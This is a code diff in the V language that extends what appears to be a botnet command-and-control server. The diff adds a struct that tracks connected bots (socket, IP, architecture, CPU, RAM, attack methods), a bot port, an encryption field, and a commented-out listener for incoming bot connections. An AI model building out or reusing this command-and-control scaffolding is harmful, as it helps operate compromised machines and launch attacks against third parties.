@@ -16,9 +16,11 @@ Server Struct and Server Functions
 pub struct Server {
 	pub mut:
 		port 			string
+		bot_port		string
 		cnc_key 		string
+		bot_encryption	string
 		clients			&Clients
-		bots 			&server.Bots
+		bots 			&Bots
 		current			&server.Current
 		notice			&utils.NotificationSys
 		sqlconn			mysql.Connection
@@ -37,6 +39,21 @@ pub struct Clients {
 		using_client	[]bool
 }
 
+/*
+Bots struct being called from Server Struct. Do not call this struct anywhere in this source!
+*/
+pub struct Bots { 
+	pub mut:
+		bot_count		int
+		bot_name		[]string
+		bot_sockets		[]net.TcpConn
+		bot_ip			[]string
+		bot_port		[]string
+		bot_arch		[]string
+		bot_cpu			[]string
+		bot_ram			[]string
+		bot_methods		[]string = ["", ""]
+}
 
 pub fn (mut s Server) set_port(port string) {
 	s.port = port
@@ -124,3 +141,23 @@ pub fn (mut c Clients) get_username(mut socket net.TcpConn) string {
 	}
 	return ""
 }
+
+/*****************************************************************************************************
+*
+*								BOT FUNCTIONS
+*
+*****************************************************************************************************/
+// pub fn start_skrillec_bot(mut svr server.Server) {
+// 	mut bot_svr := net.listen_tcp(.ip6, ":${s.port}") or { panic("[x] Error, Unable to bind server. Port is being used!") }
+// 	for {
+// 		mut bot_socket := bot_svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
+// 		bot_socket.set_read_timeout(time.infinite)
+// 		go svr.bots.bot_conn_handler(mut bot_socket, mut &svr)
+// 	}
+// }
+
+// pub fn (mut b Bots) bot_conn_handler(mut bot_socket net.TcpConn, mut svr server.Server) {
+// 	mut user_ip := bot_socket.peer_addr() or { return }
+// 	mut fixed_ip := "$user_ip".split("]:")[0].replace("[::ffff:", "")
+// 	mut fixed_port := "$user_ip".split("]:")[1]
+// }
